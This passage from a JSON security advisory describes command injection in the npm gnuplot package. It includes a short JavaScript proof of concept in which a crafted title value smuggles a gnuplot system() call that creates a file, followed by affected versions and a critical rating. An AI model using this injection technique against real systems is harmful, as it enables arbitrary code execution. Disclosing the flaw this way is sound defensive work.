The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:\n\n```\nvar gnuplot = require('gnuplot');\n\nconst title = '\"\\nset title system(\"touch testing\")\\n#';\n\ngnuplot()\n.set('term png')\n.set('output \"out.png\"')\n.set(`title \"${title}\"`)\n.set('xrange [-10:10]')\n.set('yrange [-2:2]')\n.set('zeroaxis')\n.plot('(x/4)**2, sin(x), 1/x')\n.end();\n```\n\n\n## Recommendation\n\nNo fix is currently available. Consider using an alternative package until a fix is made available.","affected":[{"package":{"name":"gnuplot","ecosystem":"npm","purl":"pkg:npm/gnuplot"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0.0.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/09/GHSA-cfwc-xjfp-44jg/GHSA-cfwc-xjfp-44jg.json"}}],"references":[{"type":"WEB","url":"https://www.npmjs.com/advisories/1440"}],"database_specific":{"cwe_ids":["CWE-77"],"github_reviewed":true,"github_reviewed_at":"2020-08-31T18:59:23Z","nvd_published_at":null,"severity":"CRITICAL"}}
